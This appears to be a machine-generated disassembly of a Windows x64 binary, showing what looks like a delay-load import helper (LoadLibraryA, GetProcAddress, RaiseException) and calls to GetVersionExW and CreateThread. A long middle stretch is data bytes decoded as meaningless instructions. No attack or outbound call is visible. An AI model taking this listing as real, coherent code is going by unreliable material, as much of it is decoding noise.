mov [ rsp + 0x118 ] 0x1
jmp r-xdata
add rsp 0x130
pop rdi
retn
mov rax [ rsp + 0xe0 ]
mov rax [ rax ]
and rax 0xffff
mov [ rsp + 0x68 ] eax
mov rax [ rsp + 0xe0 ]
mov ecx [ rax ]
call sub_40b540
add rax 0x2
mov [ rsp + 0x68 ] rax
jmp r-xdata
mov eax [ rsp + 0x118 ]
mov [ rsp + 0x60 ] eax
cmp [ rsp + 0x60 ] 0x0
je r-xdata
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x40 ]
xor ecx ecx
call [ rw-data ]
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x28 ] 0x0
je r-xdata
mov [ rsp + 0x28 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x70 ] rax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
jmp r-xdata
cmp [ rsp + 0x28 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x40 ]
mov ecx 0x2
call [ rw-data ]
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x40 ]
mov ecx 0x1
call [ rw-data ]
mov [ rsp + 0x20 ] rax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rsp + 0x28 ] 0x0
jne r-xdata
mov rax [ rsp + 0x140 ]
cmp [ rax + 0x14 ] 0x0
je r-xdata
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
mov rcx [ rsp + 0x58 ]
call LoadLibraryA
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x28 ]
mov [ rsp + 0x80 ] 0x0
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x70 ] rax
mov rax [ rsp + 0x28 ]
mov [ rsp + 0x78 ] rax
lea rdx [ rsp + 0x40 ]
mov ecx 0x5
call [ rw-data ]
mov rcx [ rsp + 0x148 ]
mov rax [ rsp + 0x28 ]
mov [ rcx ] rax
call sub_40a310
mov [ rsp + 0x80 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov rdx [ rsp + 0x68 ]
mov rcx [ rsp + 0x20 ]
call GetProcAddress
mov [ rsp + 0x28 ] rax
mov rax [ rsp + 0x140 ]
cmp [ rax + 0x1c ] 0x0
je r-xdata
mov rcx [ rsp + 0x20 ]
mov rax [ rsp + 0xb0 ]
xchg [ rax ] rcx
mov rax rcx
mov [ rsp + 0xf0 ] rax
mov rax [ rsp + 0x20 ]
cmp [ rsp + 0xf0 ] rax
je r-xdata
call sub_40a310
mov [ rsp + 0x80 ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rsp + 0x28 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x40 ]
mov ecx 0x4
call [ rw-data ]
mov [ rsp + 0x28 ] rax
mov rcx [ rsp + 0x20 ]
call sub_40ad80
mov [ rsp + 0x100 ] rax
mov rax [ rsp + 0x100 ]
cmp [ rax ] 0x4550
jne r-xdata
mov rcx [ rsp + 0x20 ]
call sub_40a2b0
mov rax [ rsp + 0x140 ]
cmp [ rax + 0x18 ] 0x0
je r-xdata
cmp [ rsp + 0x20 ] 0x0
jne r-xdata
lea rdx [ rsp + 0x40 ]
mov ecx 0x3
call [ rw-data ]
mov [ rsp + 0x20 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x108 ] rax
lea r9 [ rsp + 0x108 ]
mov r8d 0x1
xor edx edx
mov ecx 0xc06d007f
call RaiseException
mov rdx [ rsp + 0x78 ]
mov [ rsp + 0x28 ] rdx
mov rcx [ rsp + 0x100 ]
call sub_40ada0
cmp eax [ rsp + 0xd8 ]
jne r-xdata
jmp r-xdata
mov ecx 0x10
call sub_40b300
mov [ rsp + 0x110 ] rax
cmp [ rsp + 0x110 ] 0x0
je r-xdata
lea rax [ rsp + 0x40 ]
mov [ rsp + 0xf8 ] rax
lea r9 [ rsp + 0xf8 ]
mov r8d 0x1
xor edx edx
mov ecx 0xc06d007e
call RaiseException
mov rax [ rsp + 0x78 ]
jmp r-xdata
mov rdx [ rsp + 0x20 ]
mov rcx [ rsp + 0x100 ]
call sub_40adc0
movzx eax al
test eax eax
je r-xdata
mov [ rsp + 0x120 ] 0x0
mov rdx [ rsp + 0x140 ]
mov rcx [ rsp + 0x110 ]
call sub_40b2d0
mov [ rsp + 0x120 ] rax
jmp r-xdata
mov ecx [ rsp + 0x30 ]
mov rax [ rsp + 0xc8 ]
mov rax [ rax + rcx * 8 ]
mov [ rsp + 0x28 ] rax
cmp [ rsp + 0x28 ] 0x0
je r-xdata
jmp r-xdata
sub_40adc0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x30 ]
cmp [ rsp + 0x28 ] rax
jne r-xdata
mov [ rsp ] 0x0
mov [ rsp ] 0x1
jmp r-xdata
mov al [ rsp ]
add rsp 0x18
retn
sub_40ae00
mov [ rsp + 0x8 ] rcx
push rbx
sub rsp 0x90
mov [ rsp + 0x38 ] 0x0
mov rax [ rw-data ]
mov [ rsp + 0x20 ] rax
cmp [ rsp + 0xa0 ] 0x0
je r-xdata
mov [ rsp + 0x78 ] 0x0
mov rcx [ rsp + 0xa0 ]
call sub_40afe0
mov [ rsp + 0x78 ] rax
jmp r-xdata
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov rax [ rsp + 0x78 ]
mov [ rsp + 0x28 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x20 ] rax
jmp r-xdata
mov eax [ rsp + 0x38 ]
add rsp 0x90
pop rbx
retn
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x8 ]
mov ecx [ rax + 0x4 ]
call sub_40b4c0
mov [ rsp + 0x48 ] rax
mov rcx [ rsp + 0x48 ]
call sub_40afe0
mov [ rsp + 0x40 ] rax
mov rax [ rsp + 0x20 ]
mov rax [ rax ]
mov [ rsp + 0x30 ] rax
cmp [ rsp + 0xa0 ] 0x0
je r-xdata
cmp [ rsp + 0x20 ] 0x0
je r-xdata
mov rax [ rsp + 0x28 ]
cmp [ rsp + 0x40 ] rax
jne r-xdata
cmp [ rsp + 0xa0 ] 0x0
je r-xdata
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x8 ]
cmp [ rax + 0x18 ] 0x0
je r-xdata
jmp r-xdata
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0xa0 ]
call sub_40b030
test eax eax
je r-xdata
jmp r-xdata
jmp r-xdata
mov rax [ rsp + 0x20 ]
mov rax [ rax + 0x8 ]
mov [ rsp + 0x60 ] rax
mov rax [ rsp + 0x60 ]
mov ecx [ rax + 0x8 ]
call sub_40b4e0
mov [ rsp + 0x58 ] rax
mov rax [ rsp + 0x58 ]
mov rax [ rax ]
mov [ rsp + 0x50 ] rax
mov rax [ rsp + 0x60 ]
mov ecx [ rax + 0x18 ]
call sub_40b520
mov rbx rax
mov rax [ rsp + 0x60 ]
mov ecx [ rax + 0xc ]
call sub_40b500
mov rdx rbx
mov rcx rax
call sub_40b0b0
mov rcx [ rsp + 0x50 ]
call sub_40a2b0
mov r11 [ rsp + 0x58 ]
mov [ r11 ] 0x0
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x70 ] rax
mov rax [ rsp + 0x70 ]
mov [ rsp + 0x68 ] rax
cmp [ rsp + 0x68 ] 0x0
je r-xdata
mov rax [ rsp + 0x30 ]
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x80 ] 0x0
mov edx 0x1
mov rcx [ rsp + 0x68 ]
call sub_40b3a0
mov [ rsp + 0x80 ] rax
jmp r-xdata
mov [ rsp + 0x38 ] 0x1
sub_40afe0
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
mov [ rsp ] rax
mov rcx [ rsp + 0x20 ]
mov rax [ rsp ]
sub rax rcx
sub rax 0x1
add rsp 0x18
retn
jmp r-xdata
mov rax [ rsp ]
movsx ecx [ rax ]
mov rax [ rsp ]
add rax 0x1
mov [ rsp ] rax
test ecx ecx
je r-xdata
sub_40b030
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
cmp [ rsp + 0x18 ] 0x0
jne r-xdata
mov rax [ rsp + 0x18 ]
sub rax 0x1
mov [ rsp + 0x18 ] rax
cmp [ rsp + 0x18 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x8 ]
movzx edx [ rax ]
mov rax [ rsp + 0x10 ]
movzx ecx [ rax ]
mov eax edx
sub eax ecx
mov rax [ rsp + 0x8 ]
movsx ecx [ rax ]
mov rax [ rsp + 0x10 ]
movsx eax [ rax ]
cmp ecx eax
jne r-xdata
retn
mov rax [ rsp + 0x8 ]
add rax 0x1
mov [ rsp + 0x8 ] rax
mov rax [ rsp + 0x10 ]
add rax 0x1
mov [ rsp + 0x10 ] rax
jmp r-xdata
sub_40b0f0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov rax [ rsp + 0x20 ]
mov [ rsp ] rax
mov rax [ rsp ]
add rsp 0x18
retn
mov rcx [ rsp + 0x20 ]
mov rax [ rsp + 0x28 ]
movzx eax [ rax ]
mov [ rcx ] al
mov rax [ rsp + 0x20 ]
add rax 0x1
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x28 ]
add rax 0x1
mov [ rsp + 0x28 ] rax
jmp r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rsp + 0x30 ]
sub rax 0x1
mov [ rsp + 0x30 ] rax
test rcx rcx
je r-xdata
sub_40b160
mov [ rsp + 0x8 ] rcx
sub rsp 0x68
mov ecx 0x7e
call sub_40b480
mov [ rsp + 0x28 ] eax
lea rcx [ __dos_header ]
call sub_40ad80
mov [ rsp + 0x20 ] rax
mov rax [ rsp + 0x20 ]
cmp [ rax + 0xf4 ] 0x0
je r-xdata
mov eax [ rsp + 0x28 ]
add rsp 0x68
retn
mov rax [ rsp + 0x20 ]
mov ecx [ rax + 0xf0 ]
call sub_40b560
mov [ rsp + 0x30 ] rax
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x4 ] 0x0
je r-xdata
mov rax [ rsp + 0x30 ]
mov ecx [ rax + 0x4 ]
call sub_40b4c0
mov [ rsp + 0x38 ] rax
mov rcx [ rsp + 0x38 ]
call sub_40afe0
mov [ rsp + 0x40 ] rax
mov rcx [ rsp + 0x70 ]
call sub_40afe0
cmp [ rsp + 0x40 ] rax
jne r-xdata
mov rax [ rsp + 0x30 ]
mov ecx [ rax + 0xc ]
call sub_40b580
mov [ rsp + 0x48 ] rax
mov rcx [ rsp + 0x48 ]
call sub_40b350
mov eax eax
mov [ rsp + 0x58 ] rax
mov rcx [ rsp + 0x48 ]
mov rax [ rsp + 0x58 ]
lea rax [ rcx + rax * 8 ]
mov [ rsp + 0x50 ] rax
jmp r-xdata
mov rax [ rsp + 0x30 ]
add rax 0x20
mov [ rsp + 0x30 ] rax
jmp r-xdata
mov r8 [ rsp + 0x40 ]
mov rdx [ rsp + 0x38 ]
mov rcx [ rsp + 0x70 ]
call sub_40b030
test eax eax
jne r-xdata
mov rax [ rsp + 0x50 ]
cmp [ rsp + 0x48 ] rax
jae r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov [ rsp + 0x28 ] 0x0
mov rdx [ rsp + 0x48 ]
mov rcx [ rsp + 0x30 ]
call sub_40a830
jmp r-xdata
mov rax [ rsp + 0x48 ]
add rax 0x8
mov [ rsp + 0x48 ] rax
sub_40b350
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
mov [ rsp ] 0x0
mov rax [ rsp + 0x20 ]
mov [ rsp + 0x8 ] rax
mov eax [ rsp ]
add rsp 0x18
retn
mov rax [ rsp + 0x8 ]
add rax 0x8
mov [ rsp + 0x8 ] rax
mov eax [ rsp ]
add eax 0x1
mov [ rsp ] eax
jmp r-xdata
mov rax [ rsp + 0x8 ]
cmp [ rax ] 0x0
je r-xdata
sub_40b3a0
mov [ rsp + 0x10 ] edx
mov [ rsp + 0x8 ] rcx
sub rsp 0x28
mov rcx [ rsp + 0x30 ]
call sub_40b3e0
mov eax [ rsp + 0x38 ]
and eax 0x1
test eax eax
je r-xdata
mov rax [ rsp + 0x30 ]
add rsp 0x28
retn
mov rcx [ rsp + 0x30 ]
call sub_40b400
sub_40b420
mov [ rsp + 0x8 ] rcx
sub rsp 0x18
lea rax [ rw-data ]
mov [ rsp ] rax
mov rcx [ rsp ]
mov rax [ rsp + 0x20 ]
cmp [ rcx ] rax
jne r-xdata
mov rcx [ rsp ]
mov rax [ rsp + 0x20 ]
cmp [ rcx ] rax
je r-xdata
add rsp 0x18
retn
mov rcx [ rsp ]
mov rax [ rsp + 0x20 ]
mov rax [ rax ]
mov [ rcx ] rax
mov rax [ rsp ]
mov rax [ rax ]
mov [ rsp ] rax
jmp r-xdata
mov rax [ rsp ]
cmp [ rax ] 0x0
je r-xdata
sub_40b480
mov [ rsp + 0x8 ] ecx
sub rsp 0x18
cmp [ rsp + 0x20 ] 0x0
jg r-xdata
mov eax [ rsp + 0x20 ]
and eax 0xffff
or eax 0x70000
or eax 0x80000000
mov [ rsp ] eax
mov eax [ rsp + 0x20 ]
mov [ rsp ] eax
jmp r-xdata
mov eax [ rsp ]
add rsp 0x18
retn
sub_40b740
sub rsp 0x148
mov [ rsp + 0x2c ] 0x114
lea rcx [ rsp + 0x2c ]
call GetVersionExW
test eax eax
je r-xdata
add rsp 0x148
retn
mov eax [ rsp + 0x3c ]
mov [ rw-data ] eax
mov eax [ rsp + 0x30 ]
mov [ rw-data ] eax
mov eax [ rsp + 0x34 ]
mov [ rw-data ] eax
sub_40ba34
push rdx
jne r-xdata
add al [ rax ]
add al [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax + 0x40ba ] bh
jo r-xdata
add [ rax ] al
add [ rcx ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] al
mov eax 0x40ba
add al [ rax ]
xor [ rcx ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdx ] al
or dl [ rax + 0x61 ]
jb r-xdata
add [ rax ] al
insd
je r-xdata
insb
outsd
jb r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rcx ] dl
add [ rax ] al
add [ rax + 0x10 ] bl
add [ rax ] al
add [ rax ] al
add [ 0x74aa293a ] al
xor [ rax + 0x10 ] ebx
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add al bh
add al [ rax ]
add [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] ch
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add eax 0x70797243
je r-xdata
adc [ rax ] al
add [ rax ] al
add [ rax ] al
sub [ rax ] eax
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al [ rsi ]
insb
je r-xdata
add [ rax ] al
mov edx 0x40
add [ rax ] al
clc
add al [ rax ]
mov eax 0x4010
add [ rax ] al
add [ rax + rax ] ch
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al [ rsi ]
insb
push rbx
movsxd eax [ gs : rdx ]
add [ rdx ] al
add [ rax ] al
sub_40bafe
push rbx
je r-xdata
add [ rax ] al
add [ rax ] al
add al [ 0x65a627b5 ]
jo r-xdata
adc [ rax ] al
add [ rax ] al
add [ rax ] al
or al 0x0
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al [ 0x70ba2dbe ]
je r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0x10000000
mov ecx 0x40
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al [ rdi ]
push rbx
jb r-xdata
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] dl
mov ecx 0x40
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
mov al 0xba
add [ rax ] al
add [ rax ] al
add [ rax ] dl
mov edx 0x40
add [ rax ] al
adc [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al [ rbx ]
jns r-xdata
add [ rax + 0x40ba ] dh
add [ rax ] al
add [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add ecx [ rbx + 0x65 ]
jns r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax + 0x40bc ] al
add [ rax ] al
add [ rax ] dl
rol [ rax ] 0x0
jb r-xdata
adc [ rax ] al
add [ rax ] al
add [ rax ] al
sbb [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add cl [ rax ]
jns r-xdata
add [ rax + 0x4010 ] bh
add [ rax ] al
add [ rax ] bl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdx ] al
or [ rbx + 0x65 ] cl
jns r-xdata
jo r-xdata
add al [ rax ]
mov eax 0x4010
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add eax 0x65656c53
add [ rax ] al
add [ rax ] al
add [ rax ] ah
push rsi
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rsi
add [ rax ] al
add [ rax ] al
add al dl
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
sub al 0xbd
add [ rax ] al
add [ rax ] al
add [ rax ] bl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] ch
adc al 0x40
outsd
jne r-xdata
add [ rax ] al
add al al
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] al
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] dl
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] ah
pop rdx
add [ rax ] al
add [ rax ] al
add al dh
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rbx
add [ rax ] al
add [ rax ] al
add [ rax + 0x53 ] ah
add [ rax ] al
add [ rax ] al
add [ rax + 0x412d ] ah
add [ rax ] al
add [ rax + 0x4053 ] al
add [ rax ] al
add [ rax + 0x4053 ] dl
add [ rax ] al
add [ rax + 0x4053 ] ah
add [ rax ] al
add [ rsi ] cl
add [ rax ] al
add [ rax ] al
add [ rcx ] al
add [ rax ] al
add [ rax ] dl
mov ecx 0x40
add [ rax ] al
or [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] eax
add [ rax ] dl
mov ecx 0x40
add [ rax ] al
or [ rax ] al
add [ rax ] al
add al 0x4c
imul esi [ rbx + 0x74 ] 0x2
or [ rax ] eax
xor edi [ rbp + 0x40 ]
add [ rax ] al
add cl r14b
jmp [ rbp - 0x43 ]
add [ rax ] al
add [ rax ] al
rcr [ rcx + 0x40 ] 0x1
add [ rax ] al
je r-xdata
add [ rax ] al
add [ rdx + 0x40bc ] bl
add [ rax ] al
add [ rdx + 0x40bc ] bh
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rdi * 4 + 0x40 ] ch
add [ rax ] al
sbb [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
sub [ rax + rax * 2 ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] al
cmp [ rax + rax * 2 ] 0x0
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
cmp [ rax + rax * 2 ] 0x0
adc al al
add [ rax ] al
add [ rdx ] al
sub_40c012
push rsp
jns r-xdata
add [ rcx ] dl
add [ rax ] al
add [ rax + 0x10 ] bl
add [ rax ] al
add [ rax ] al
add [ 0x74aa2ec6 ] al
cmp [ r8 + rax * 2 ] 0x0
or [ rax ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ 0x74aa2e84 ] al
xor [ rax ] eax
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax - 0x40 ] al
add [ rax ] al
add [ rax ] al
add [ rcx ] dl
adc dl [ rbp + rcx * 2 + 0x79 ]
outsb
je r-xdata
add [ rax ] al
mov esi 0x40c1
add [ rax ] al
add [ rax ] al
jb r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dh
retn 0x40
je r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax - 0x3f ] cl
add [ rax ] al
add [ rax ] al
add al dl
add [ rax ] al
add [ rax ] al
rol [ rax ] 0x0
push rsp
jns r-xdata
add [ rax ] al
sub [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
sub [ rax + rax * 2 ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] ah
push rsi
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rsi
add [ rax ] al
add [ rax ] al
add al dl
pop rcx
add [ rax ] al
add [ rax ] al
add al al
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] al
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] dl
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] ah
pop rdx
add [ rax ] al
add [ rax ] al
add al dh
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rbx
add [ rax ] al
add [ rax ] al
add [ rax + 0x53 ] ah
add [ rax ] al
add [ rax ] al
add [ rax + 0x4125 ] al
add [ rax ] al
add [ rax + 0x4053 ] al
add [ rax ] al
add [ rax + 0x4053 ] dl
add [ rax ] al
add [ rax + 0x4053 ] ah
add [ rax ] al
add [ rsi ] cl
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] bh
rol [ rax ] 0x0
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dh
adc [ rax ] eax
add [ rax ] al
add [ rax ] al
sbb [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add eax [ rax ]
add [ rax ] bh
rol [ rax ] 0x0
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rsp + rax * 2 ] al
jae r-xdata
xor [ rax + 0x10 ] ebx
add [ rax ] al
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] al
add [ rax - 0x3f ] cl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
adc [ rax ] eax
add [ rax ] al
pop rax
adc [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0x74696e55
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
sub_40c0a2
add [ rax ] al
add [ rax ] al
add [ rdx - 0x3f ] dh
add [ rax ] al
add [ rax ] al
add [ rsi + 0x40c1 ] bh
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dh
retn 0x40
sub_40c1ea
add [ rax ] al
add [ rax ] al
add cl sil
[ rbp - 0x3d ]
add [ rax ] al
add [ rax ] al
add [ rdx ] al
int1
[ rdi + 0x40c3 ]
add [ rax ] al
add [ rdx ] al
int1
call rsi
retn
sub_40c4bd
outsd
jae r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
rol ah 0x1
add [ rax ] al
add [ rax ] al
add [ rdi ] al
or edx [ rbp + rcx * 2 + 0x79 ]
outsb
je r-xdata
add [ rdx ] al
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
adc dh al
add [ rax ] al
jb r-xdata
xor [ rcx ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] dl
add [ rax ] al
add [ rcx ] cl
push bx
jb r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
mov [ rax ] 0x0
je r-xdata
add [ rax ] al
jb r-xdata
add bh bh
rol [ rax ] 0x0
add [ rax ] al
add [ rax ] cl
and [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0x74696e55
xor [ rax ] eax
add [ rax ] al
add [ rdx ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
or ch al
add [ rax ] al
add [ rax ] al
add [ rcx ] dl
adc [ rdx ] edi
push rsp
jns r-xdata
xor [ rcx ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] bl
add [ rax ] al
add [ rdx ] al
add r8b [ rax ]
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dl
mov [ rax ] 0x0
add [ rax ] al
add [ rax - 0x39 ] dh
add [ rax ] al
add [ rax ] al
add [ rdx - 0x3a ] bl
add [ rax ] al
add [ rax ] al
add cl dl
mov [ rax ] 0x0
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add bh ch
outsd
ja r-xdata
mov [ rax ] 0x0
add [ rax ] al
add [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] al
sub [ rax + rax * 2 ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] ah
push rsi
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rsi
add [ rax ] al
add [ rax ] al
add al dl
pop rcx
add [ rax ] al
add [ rax ] al
add al al
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] al
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] dl
pop rdx
add [ rax ] al
add [ rax ] al
add [ rax ] ah
pop rdx
add [ rax ] al
add [ rax ] al
add al dh
pop rcx
add [ rax ] al
add [ rax ] al
add [ rax ] dh
push rbx
add [ rax ] al
add [ rax ] al
add [ rax + 0x53 ] ah
add [ rax ] al
add [ rax ] al
add [ rax - 0x37 ] ah
add [ rax ] al
add [ rax ] al
add [ rax + 0x4053 ] al
add [ rax ] al
add [ rax + 0x4053 ] dl
add [ rax ] al
add [ rax + 0x4053 ] ah
add [ rax ] al
add [ rsi ] cl
add [ rax ] al
add [ rax ] al
add [ rax + rax ] al
add [ rax ] al
xor [ rcx ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] dl
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] dh
adc [ rax ] eax
add [ rax ] al
add [ rax ] al
sbb [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add ch al
add [ rax ] al
add [ rax ] al
add [ rax ] ah
add [ rax ] al
add [ rax ] al
add [ rax ] al
add al dh
mov edx 0x40
add [ rax ] al
sub [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
add eax 0xc4c80000
add [ rax ] al
add [ rax ] al
add [ rax ] cl
add [ rax ] al
add [ rcx + rcx * 2 ] al
outsb
je r-xdata
add [ rax ] al
add [ rax ] al
add [ rax ] al
add [ rax ] al
out dx eax
insb
outsd
sub_40c6a8
add [ rax ] al
add [ rax ] al
add [ rax ] ah
add [ rax ] al
add [ rdi ] al
outsd
outsb
imul sp [ rdi + 0x73 ] 0x2
add al dh
mov edx 0x40
add [ rax ] al
sub [ rax ] al
add [ rax ] al
add eax 0x55746553
jo r-xdata
add [ rdx ] al
add ch bh
mov [ rax ] 0x0
add [ rax ] al
add [ rax + rax - 0xf ] al
[ rdi ]
add [ rax ] al
sub_40c7a0
push rbx
sub rsp 0x30
xor rbx rbx
xor rcx rcx
xor rdx rdx
lea r8 [ sub_40c800 ]
xor r9 r9
mov [ rsp + 0x20 ] 0x0
lea rax [ rw-data ]
mov [ rsp + 0x28 ] rax
call CreateThread
mov [ rw-data ] eax
mov ecx [ rw-data ]
or edx 0xffffffff
call WaitForSingleObject
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
add rsp 0x30
pop rbx
retn
mov bl 0x1
sub_40c820
push rbp
push rbx
sub rsp 0x38
mov rbp rsp
mov [ rbp + 0x28 ] rbp
mov [ rbp + 0x50 ] rcx
mov [ rbp + 0x58 ] dl
cmp [ rbp + 0x58 ] 0x0
je r-xdata
nop
mov rcx [ rbp + 0x50 ]
xor rdx rdx
xor r8 r8
call sub_411c20
mov rcx [ r-xdata ]
mov dl 0x1
call sub_412360
mov rcx [ rbp + 0x50 ]
mov [ rcx + 0x8 ] rax
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x18 ]
call sub_407780
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x20 ]
mov rdx [ r-xdata ]
mov r8d 0x1
xor r9 r9
call sub_409850
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov rax [ rbp + 0x50 ]
lea rcx [ rax + 0x10 ]
lea rdx [ r-xdata ]
call sub_407ca0
cmp [ rbp + 0x58 ] 0x0
je r-xdata
mov rcx [ rbp + 0x50 ]
movzx rdx [ rbp + 0x58 ]
call sub_405d70
mov [ rbp + 0x50 ] rax
mov rax [ rbp + 0x50 ]
lea rsp [ rbp + 0x38 ]
pop rbx
pop rbp
retn
mov rcx [ rbp + 0x50 ]
call sub_405db0
mov [ rbp + 0x50 ] rax
jmp r-xdata
sub_40c8dc
